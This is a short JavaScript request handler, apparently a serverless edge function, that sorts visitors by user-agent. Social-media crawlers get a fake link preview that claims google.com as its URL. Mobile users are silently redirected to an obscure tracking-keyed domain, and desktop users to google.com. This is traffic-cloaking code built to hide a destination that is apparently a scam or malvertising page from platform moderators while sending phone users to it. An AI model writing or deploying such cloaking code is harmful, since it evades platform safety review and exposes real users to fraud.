export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="💢 💢 💢 💢">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://5lpwx82oiu.ucarecd.net/d1c27346-1a1c-4290-8ae1-dea444fd088c/f13.jpg">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://colinsidewaychancy.com/gdg6se18?key=0d0651c115b61ec8ba6d4de3b9e72681", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
